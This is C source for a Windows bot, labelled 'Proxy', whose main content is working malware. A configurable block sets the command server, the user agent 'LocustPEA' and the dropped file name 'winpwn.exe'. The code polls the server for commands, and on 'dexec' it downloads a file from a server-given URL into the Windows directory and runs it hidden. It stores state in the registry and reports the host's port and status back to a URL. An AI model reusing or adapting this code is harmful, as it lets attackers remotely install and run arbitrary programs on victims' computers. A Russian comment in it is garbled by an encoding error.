/**
* Proxy
* Copyright ©2008 Loki - All Rights Reserved
**/
#pragma comment(lib,  "Urlmon.lib")
#include <urlmon.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "report.h"
extern char url[];
/* -----------EDIT ME-------------------------*/
#define     HTTPSERV		"localhost"
#define		HTTPPORT		80
#define		HTTPPATH		"/w/getcommand.php"	
#define		USERAGENT		"LocustPEA"
#define		HTTPFREQ		15	
#define		DATAKEY			"Software\\Microsoft\\Windows"
#define		EXENAME			"winpwn.exe"
#define		REGNAME			"lopea" 
/* -----------EDIT ME-------------------------*/

#define		URLMON_DLL		"urlmon.dll"

static DWORD WINAPI GetIpByHostname(char *host)
{
    DWORD ret = 0;
    struct hostent * hp = gethostbyname(host);
    if (!hp) ret = inet_addr(host);
    if ((!hp)&&(ret == INADDR_NONE)) return 0;
    if (hp != NULL) memcpy((void*)&ret, hp->h_addr,hp->h_length);
    return ret;
}
DWORD WINAPI GetCommand(char szData) 
{
	char recvbuffer[1024], getpack[1024], windirpath[256];
	char *temp, *token[256], *t, *nourl;
	char lasturl[256]={0};
	int i; 
	HKEY hKeyWrite, hKeyRead;
	DWORD lasturlLen = sizeof(lasturl);
	SOCKET httpsock; 
	SOCKADDR_IN httpsocket;
	DWORD cchBuff;  
	cchBuff = 256;
	nourl = "nourl";
	
	
	while(1)
	{
		ZeroMemory(recvbuffer, sizeof(recvbuffer));
		memset(recvbuffer, 0, 1024);
		httpsocket.sin_addr.S_un.S_addr = GetIpByHostname(HTTPSERV);
		httpsocket.sin_family = AF_INET;
		httpsocket.sin_port = htons(HTTPPORT);
		
		lstrcpy(getpack, "GET ");
		lstrcat(getpack, HTTPPATH);
		lstrcat(getpack, "?getcmd=1");
		lstrcat(getpack, " HTTP/1.0\r\n");
		lstrcat(getpack, "User-Agent: ");
		lstrcat(getpack, USERAGENT);
		lstrcat(getpack, "\r\nHost: ");
		lstrcat(getpack, HTTPSERV);
		lstrcat(getpack, "\r\n\r\n");
		
		httpsock = socket(AF_INET,SOCK_STREAM,0);
		connect(httpsock, (struct sockaddr *)&httpsocket, sizeof(httpsocket)); 
		send(httpsock, getpack, lstrlen(getpack),0);
		
		while(i = recv(httpsock, recvbuffer+lstrlen(recvbuffer), 1, 0))
		{
			if (i == SOCKET_ERROR) return -1; 
		}
		
		for(i = 0; recvbuffer[i]!=0; ++i)
		{
		          if((recvbuffer[i]=='\r')&&(recvbuffer[i+1]=='\n')
					  &&(recvbuffer[i+2]=='\r')&&(recvbuffer[i+3]=='\n'))
				  {
					  temp = (char*)&recvbuffer[i] + 4;
					  break;
				  }
		}
		
		if(lstrcmp(temp,"")==0) return 0;
		t = strtok(temp,"Р");
		
		
		for(i = 0; t; t = strtok(NULL,"Р"), i++)
		{
			token[i] = t; 
			
			if(lstrcmp(token[0],"dexec")==0)
			{
				HRESULT hUdtf;
				char * url2, lasturl;
				//		 HKEY hk; 
				lasturl = NULL; 
				url2 = token[1];
				// проверка: качалс€ ли файл или нет? если нет, то пишем в реестр новый урл последнего скаченного файла. 
				
				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, DATAKEY , 0, KEY_QUERY_VALUE, &hKeyRead)==ERROR_SUCCESS)
				{
					
					if(RegQueryValueEx(hKeyRead, REGNAME, 0, 0, (unsigned char *)lasturl, &lasturlLen)==ERROR_SUCCESS)
					{
						if(lstrcmp(url2, (const char *)lasturl)==0)
						{
							return FALSE;
						}
						RegCloseKey(hKeyRead);
					} 
					else 
					{
						if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, DATAKEY, 0, KEY_WRITE, &hKeyWrite)==ERROR_SUCCESS)
						{
							RegSetValueEx(hKeyWrite, REGNAME, 0, REG_SZ, (const unsigned char *)url2, strlen(url2));
							RegCloseKey(hKeyWrite);
							return FALSE; 
						}		
						RegCloseKey(hKeyRead);
						RegCloseKey(hKeyWrite);
					}
				}  	
				GetWindowsDirectory(windirpath, 256);
				lstrcat(windirpath,EXENAME);
				LoadLibrary(URLMON_DLL);
				
				__try
				{
					hUdtf = URLDownloadToFile(NULL, url2, windirpath, 0, NULL); 
					if(hUdtf == S_OK)
					{
						
						if(WinExec(windirpath, SW_HIDE) > 32)
						{								
							return TRUE;
						}
						else return FALSE;
					}
				}
				__except(EXCEPTION_EXECUTE_HANDLER)
				{
					return FALSE;
				}
				
			}
			
			closesocket(httpsock);
			Sleep(HTTPFREQ*60*1000);
		}
	}

	return 0;
		
}
BOOL Reporter(char *szReportUrl)
{
	char readbuf[1024];
	HINTERNET httpopen, openurl;
	DWORD read;
	httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	openurl=InternetOpenUrl(httpopen,szReportUrl,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
	if (!openurl)
	{
		InternetCloseHandle(httpopen);
		InternetCloseHandle(openurl);
	}
	InternetReadFile(openurl,readbuf,sizeof(readbuf),&read);
	InternetCloseHandle(httpopen);
	InternetCloseHandle(openurl);
	
	return TRUE;
}
int MakeReport(int Port,int Private) /// Make url and start request
{
	
	char szPort[18];
	char szPrivate[2];
	char szURL[160];
	
	sprintf(szURL,"%s",url);
	sprintf(szPort,"%d",Port);
	sprintf(szPrivate, "%d",Private);
	
	// Make URL for reporter
	strcat(szURL,"?p=");
	strcat(szURL,szPort);
	strcat(szURL,"&n=");
	strcat(szURL,szPrivate);
	
#ifdef _DEBUG
	printf("Reporting %s\n",szURL);
#endif
	Sleep(100);
	
    Reporter(szURL);
	return 1;
}
